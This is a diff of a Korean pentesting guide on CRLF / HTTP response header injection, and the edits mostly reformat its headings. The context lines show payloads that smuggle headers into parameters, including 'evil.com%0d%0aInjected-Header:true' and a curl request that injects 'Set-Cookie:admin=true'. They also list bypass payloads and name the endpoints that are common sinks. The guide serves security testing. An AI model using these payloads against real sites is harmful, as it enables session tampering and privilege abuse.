@@ -1,6 +1,4 @@
-### Phase 2: 동적 테스트 (검증)
-
-**기본 페이로드:**
+### 기본 페이로드
 
 **HTTP 응답 헤더 인젝션 (가장 흔한 sink — Location, Set-Cookie):**
 - `evil.com%0d%0aInjected-Header:true` (URL parameter, redirect sink)
@@ -53,7 +51,7 @@ curl -v "https://target/api/setpref?lang=ko%0d%0aSet-Cookie:admin=true" 2>&1 | g
 
 ---
 
-**우회 페이로드:**
+### 우회 페이로드
 
 | 방어 | 페이로드 |
 |---|---|
@@ -75,7 +73,7 @@ Smuggled: yes"
 
 ---
 
-**참고사항:**
+### 참고사항
 
 - Node 4.6+, PHP 8+, Java Servlet 3.1+, Django 1.x+, Flask 0.9+는 런타임 차단 — 레거시 환경 우선 점검
 - 패스워드 리셋/이메일 변경/리다이렉트 endpoint가 빈출 sink
